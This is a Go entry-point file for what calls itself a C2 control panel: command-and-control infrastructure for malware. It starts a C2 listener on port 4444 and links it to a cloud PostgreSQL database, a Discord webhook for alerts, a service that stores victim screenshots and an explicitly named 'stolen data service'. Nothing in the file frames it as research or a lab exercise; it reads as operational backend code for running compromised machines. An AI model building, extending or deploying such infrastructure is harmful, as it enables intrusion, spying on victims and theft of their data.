package main

import (
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"

	"c2-control-panel/api"
	"c2-control-panel/c2server"
	"c2-control-panel/database"
	"c2-control-panel/services"
	"c2-control-panel/websocket"

	"github.com/joho/godotenv"
)

func getEnv(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func main() {
	if err := godotenv.Load(); err != nil {
		log.Println("[!] No .env file found, using environment variables")
	} else {
		log.Println("[✓] Loaded .env file")
	}

	log.Println("[*] C2 Control Panel Starting...")

	// PostgreSQL connection
	dbHost := getEnv("DB_HOST", "c2panel-postgres.postgres.database.azure.com")
	dbPort := getEnv("DB_PORT", "5432")
	dbUser := getEnv("DB_USER", "c2admin")
	dbPassword := getEnv("DB_PASSWORD", "")
	dbName := getEnv("DB_NAME", "c2panel")
	
	c2Port  := getEnv("C2_PORT", ":4444")
	apiPort := getEnv("API_PORT", ":8080")

	log.Println("[*] Initializing PostgreSQL database...")
	connStr := fmt.Sprintf(
		"host=%s port=%s user=%s password=%s dbname=%s sslmode=require",
		dbHost, dbPort, dbUser, dbPassword, dbName,
	)
	db, err := database.InitPostgres(connStr)
	if err != nil {
		log.Fatal("Failed to initialize database:", err)
	}
	defer db.Close()
	log.Println("[✓] Database initialized")

	log.Println("[*] Starting WebSocket hub...")
	hub := websocket.NewHub()
	go hub.Run()
	log.Println("[✓] WebSocket hub started")

	// Initialize enhanced services
	log.Println("[*] Initializing Discord bot...")
	discordBot := services.NewDiscordBot()
	if discordBot.Enabled {
		log.Println("[✓] Discord webhook enabled")
	} else {
		log.Println("[!] Discord webhook not configured (set DISCORD_WEBHOOK_URL)")
	}

	log.Println("[*] Initializing screenshot service...")
	screenshotPath := getEnv("SCREENSHOT_STORAGE_PATH", "./screenshots")
	screenshotURL := getEnv("SCREENSHOT_BASE_URL", "http://localhost:8080/screenshots")
	screenshotService := services.NewScreenshotService(db.DB, screenshotPath, screenshotURL)
	log.Println("[✓] Screenshot service initialized")

	log.Println("[*] Initializing stolen data service...")
	stolenDataService := services.NewStolenDataService(db.DB, discordBot)
	log.Println("[✓] Stolen data service initialized")

	log.Println("[*] Starting C2 Server...")
	c2Server := c2server.NewServerEnhanced(c2Port, db.DB, hub, discordBot, screenshotService, stolenDataService)
	go func() {
		if err := c2Server.Start(); err != nil {
			log.Printf("[!] C2 Server error: %v", err)
		}
	}()
	log.Printf("[✓] C2 Server listening on %s", c2Port)

	log.Println("[*] Starting API Server...")
	apiServer := api.NewServer(apiPort, db.DB, hub, c2Server.Server)
	go func() {
		if err := apiServer.Start(); err != nil {
			log.Printf("[!] API Server error: %v", err)
		}
	}()
	log.Printf("[✓] REST API listening on %s", apiPort)
	log.Println("[✓] Dashboard: http://localhost:3000")

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	log.Println("[*] Shutting down gracefully...")
}